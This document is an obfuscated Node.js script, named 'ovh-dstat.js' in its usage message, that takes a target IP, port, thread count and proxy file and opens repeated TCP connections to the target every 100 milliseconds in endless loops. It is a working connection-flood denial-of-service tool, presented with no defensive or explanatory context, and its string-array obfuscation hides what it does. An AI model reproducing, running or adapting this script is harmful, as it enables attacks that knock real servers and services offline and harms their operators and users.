const _0x5dc7a2=_0x323e;(function(_0x287dee,_0x1dec66){const _0x797373=_0x323e,_0x598d53=_0x287dee();while(!![]){try{const _0x8e5ca5=parseInt(_0x797373(0xd9))/0x1+parseInt(_0x797373(0xd7))/0x2+-parseInt(_0x797373(0xda))/0x3+-parseInt(_0x797373(0xd5))/0x4*(-parseInt(_0x797373(0xcf))/0x5)+-parseInt(_0x797373(0xe3))/0x6+-parseInt(_0x797373(0xd4))/0x7+-parseInt(_0x797373(0xd0))/0x8*(parseInt(_0x797373(0xdf))/0x9);if(_0x8e5ca5===_0x1dec66)break;else _0x598d53['push'](_0x598d53['shift']());}catch(_0x429059){_0x598d53['push'](_0x598d53['shift']());}}}(_0x5eb1,0xd3b7e));const fs=require('fs'),net=require(_0x5dc7a2(0xe2)),{argv,exit}=require(_0x5dc7a2(0xd3)),[,,ip,port,threads,proxyFile]=argv;(!ip||!port||!threads||!proxyFile)&&(console[_0x5dc7a2(0xe4)]('Usage:\x20node\x20ovh-dstat.js\x20<IP>\x20<port>\x20<threads>\x20<proxyFile>'),exit(0x1));const threadCount=parseInt(threads,0xa);function _0x5eb1(){const _0x9221e8=['net','2570226bfiruQ','error','readFileSync','log','81015EGgCpl','93128RwwQKa','Connected\x20to\x20','write','process','5768861rNuhLT','244dZaxuI','Threads\x20must\x20be\x20a\x20positive\x20integer','2024342FScOmK','connect','523391ZUAcUD','758760gJuKot','Error:\x20','trim','Socket','Error\x20reading\x20proxy\x20file:\x20','117KndbDw','message','Proxy:\x20'];_0x5eb1=function(){return _0x9221e8;};return _0x5eb1();}(isNaN(threadCount)||threadCount<=0x0)&&(console[_0x5dc7a2(0xe4)](_0x5dc7a2(0xd6)),exit(0x1));let proxy;function _0x323e(_0x559915,_0x55d7af){const _0x5eb1b0=_0x5eb1();return _0x323e=function(_0x323e50,_0x34e7b3){_0x323e50=_0x323e50-0xcd;let _0x4f7a43=_0x5eb1b0[_0x323e50];return _0x4f7a43;},_0x323e(_0x559915,_0x55d7af);}try{proxy=fs[_0x5dc7a2(0xcd)](proxyFile,'utf8')[_0x5dc7a2(0xdc)]();}catch(_0x12c3c0){console[_0x5dc7a2(0xe4)](_0x5dc7a2(0xde)+_0x12c3c0[_0x5dc7a2(0xe0)]),exit(0x1);}function createConnection(){const _0x755b79=_0x5dc7a2,_0x2decbc=new net[(_0x755b79(0xdd))]();_0x2decbc[_0x755b79(0xd8)](port,ip,()=>{const _0x5d63a3=_0x755b79;console[_0x5d63a3(0xce)](_0x5d63a3(0xd1)+ip+':'+port),_0x2decbc[_0x5d63a3(0xd2)](_0x5d63a3(0xe1)+proxy+'\x0d\x0a');}),_0x2decbc['on'](_0x755b79(0xe4),_0x4ff066=>{const _0x42ef68=_0x755b79;console[_0x42ef68(0xe4)](_0x42ef68(0xdb)+_0x4ff066[_0x42ef68(0xe0)]);});}for(let i=0x0;i<threadCount;i++){(function connectLoop(){createConnection(),setTimeout(connectLoop,0x64);}());}